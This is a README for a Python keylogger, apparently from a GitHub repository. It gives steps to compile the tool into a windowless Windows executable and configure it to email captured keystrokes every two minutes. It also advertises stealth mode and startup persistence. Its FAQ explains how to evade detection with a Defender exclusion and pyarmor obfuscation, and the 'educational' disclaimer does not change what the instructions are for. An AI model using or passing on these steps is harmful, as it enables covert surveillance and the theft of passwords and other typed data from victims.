# 🖥️ Python Keylogger  
*A lightweight, educational keylogger for Windows & Linux*  

> ⚠️ **Warning**: Use only for **ethical/educational purposes**. Unauthorized use is illegal.  

---

## 🚀 Quick Start  
### 1️⃣ **Install Dependencies**  
Run this in terminal (Linux/Windows):  
```bash
# Install Python if missing (Linux)
sudo apt update && sudo apt install python3 python3-pip -y

# Install dependencies
pip install pynput pyinstaller
2️⃣ Download & Run
bash
git clone https://github.com/yourusername/keylogger.git
cd keylogger
python3 keylogger.py  # Or compile with PyInstaller
3️⃣ Compile to EXE (Optional)
bash
pyinstaller --onefile --noconsole keylogger.py
# Output: ./dist/keylogger.exe
⚙️ Configuration
Edit keylogger.py before running:

python
# Email settings (Gmail recommended)
sender = "your_email@gmail.com"
password = "your_app_password"  # Enable 2FA & generate App Password
receiver = "receiver_email@gmail.com"
report_interval = 120  # Email logs every 2 minutes
🔧 Features
📁 Local Logging: Saves to keylog.txt

📧 Email Reports: Auto-sends logs via SMTP

👻 Stealth Mode: No terminal popup (Windows)

🔄 Persistence: Add to startup (Windows only)

❓ FAQ
Q: How to make it undetectable?

Disable Defender: Add exclusion for the .exe

Obfuscate: Use pyarmor to encrypt the script

Q: Why is my email not sending?

Enable "Less Secure Apps" in Gmail or use an App Password

📜 Legal Disclaimer
This tool is for educational purposes only. The creator assumes no liability for misuse.

📌 Credits
Coded with ❤️ by [Your Name]
🔗 GitHub: github.com/yourusername
